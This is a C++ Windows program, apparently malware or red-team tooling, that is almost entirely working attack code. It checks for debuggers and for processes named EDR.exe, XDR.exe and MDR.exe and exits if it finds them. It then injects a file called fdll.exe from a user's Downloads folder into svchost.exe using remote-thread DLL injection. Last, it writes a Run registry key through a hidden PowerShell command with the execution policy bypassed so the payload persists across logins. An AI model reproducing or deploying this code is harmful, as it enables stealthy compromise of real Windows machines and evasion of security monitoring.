#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>

// Obfuscated junk code
void ObfuscatedJunkCode() {
    volatile int x = 0;
    for (int i = 0; i < 100; i++) {
        x += i;
        if (x % 2 == 0) x++;
    }
}

// Anti-debug check
bool IsDebuggerPresentObfuscated() {
    return (IsDebuggerPresent() || (GetTickCount() < 1000));
}

// Get PID of svchost.exe
DWORD GetSvchostPIDObfuscated() {
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "svchost.exe") == 0 && pe.th32ProcessID != GetCurrentProcessId()) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// Inject fdll.exe into svchost.exe
void InjectIntoSvchostObfuscated() {
    const char* dllPath = "C:\\Users\\i_rajesh.chandrappa\\Downloads\\fdll.exe";
    DWORD pid = GetSvchostPIDObfuscated();
    if (!pid) return;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    LPVOID pRemoteMem = VirtualAllocEx(hProcess, nullptr, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, dllPath, strlen(dllPath) + 1, nullptr);

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMem, 0, nullptr);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

// Function to execute PowerShell command
void ExecutePowerShellCommand(const char* command) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "powershell -NoProfile -ExecutionPolicy Bypass -Command \"%s\"", command);
    CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Function to create registry key using PowerShell
void CreateRegistryKey(const char* keyPath, const char* valueName, const char* valueData) {
    char command[1024];
    snprintf(command, sizeof(command), "New-Item -Path \"%s\" -Force | Set-ItemProperty -Name \"%s\" -Value \"%s\"", keyPath, valueName, valueData);
    ExecutePowerShellCommand(command);
}

// Function to check if the code is being monitored
bool IsMonitored() {
    // Check for common monitoring processes
    const char* monitoringProcesses[] = {
        "EDR.exe",
        "XDR.exe",
        "MDR.exe"
    };

    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < sizeof(monitoringProcesses) / sizeof(monitoringProcesses[0]); i++) {
                if (_stricmp(pe.szExeFile, monitoringProcesses[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return false;
}

int main() {
    if (IsMonitored()) {
        std::cout << "Monitoring detected. Terminating..." << std::endl;
        return 1;
    }

    ObfuscatedJunkCode();
    if (IsDebuggerPresentObfuscated()) return 1;

    InjectIntoSvchostObfuscated();
    CreateRegistryKey("HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "FdllUpdate", "C:\\Users\\i_rajesh.chandrappa\\Downloads\\fdll.exe");

    std::cout << "Persistence set. fdll.exe will run on reboot/login." << std::endl;
    return 0;
}
